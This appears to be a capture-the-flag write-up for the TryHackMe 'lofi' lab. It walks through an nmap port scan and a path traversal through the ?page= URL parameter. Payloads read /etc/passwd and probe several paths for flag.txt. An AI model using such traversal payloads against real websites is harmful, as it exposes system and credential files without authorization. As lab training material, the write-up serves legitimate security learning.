> Want to hear some lo-fi beats, to relax or study to? We've got you [covered](https://tryhackme.com/room/lofi)! 

Even if the instructions tell us to connect to `http://target-IP` on our navigator, we can confirm the open ports using a fast nmap scan :

```shell
$ nmap -p- -T4 target
Starting Nmap 7.93 ( https://nmap.org ) at 2025-02-11 19:59 CET
Nmap scan report for target (10.10.106.154)
Host is up (0.040s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 22.63 seconds
```

Now that we've confirmed it, we can navigate to the web page on port `80` :

The first page doesn't seem very special but if we click on one of the options under the *Discography* section, and when we look at the URL, there is a `?page=` parameter that is equal to `relax.php`.

It very much looks like a path traversal vulnerability that we can use to our advantage.

Letâ€™s try a simple payload to check if this works :

```console
http://target/?page=../../../../../../../../../../etc/passwd
```

Indeed, it displays `/etc/passwd`.

Now that we know it actually works, we can check for different payloads with the `flag.txt` file name :

```console
# Among famous directories we could try
../../../../../../../../../../flag.txt
../../../../../../../../../../var/www/html/flag.txt
../../../../../../../../../../tmp/flag.txt
```

So we try them one by one and indeed, as the instructions said, we can find the flag in the *root of the filesystem*.
